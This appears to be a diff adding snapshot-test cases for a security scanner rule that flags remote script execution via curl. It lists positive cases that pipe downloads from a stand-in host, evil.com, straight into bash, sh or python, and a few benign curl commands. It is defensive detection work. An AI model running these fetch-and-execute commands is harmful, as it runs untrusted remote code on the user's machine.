@@ -1,0 +1,14 @@
+# SC-001: Remote script execution via curl
+# Test cases for snapshot testing
+
+# === Cases that SHOULD be detected ===
+curl https://evil.com/install.sh | bash
+curl -s https://evil.com/script.sh | sh
+curl -sSL https://get.evil.com | bash
+bash -c "$(curl -fsSL https://evil.com/install.sh)"
+source <(curl -s https://evil.com/env.sh)
+curl https://example.com/script.sh | python
+
+# === Cases that should NOT be detected ===
+curl https://api.github.com/repos
+curl -o file.sh https://example.com/script.sh
